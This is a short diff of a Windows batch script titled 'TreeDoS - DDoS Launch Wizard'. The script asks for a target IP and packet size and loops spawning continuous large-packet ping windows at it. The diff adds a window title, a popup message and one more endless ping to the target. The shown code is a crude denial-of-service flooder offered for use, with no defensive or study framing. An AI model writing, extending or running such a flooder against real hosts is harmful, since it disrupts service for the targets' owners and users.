@@ -1,4 +1,5 @@
 @echo off
+title TreeDoS - DDoS Launch Wizard
 color 0A
 echo TreeDoS by Three
 echo Set target
@@ -21,5 +22,6 @@ start ping -t -l %p% %ip%
 set /a v=v+=1
 goto ddos
 :end
-pause
+msg * "Sending Status CMD prompt to screen"
+start ping -t %ip% 
 exit
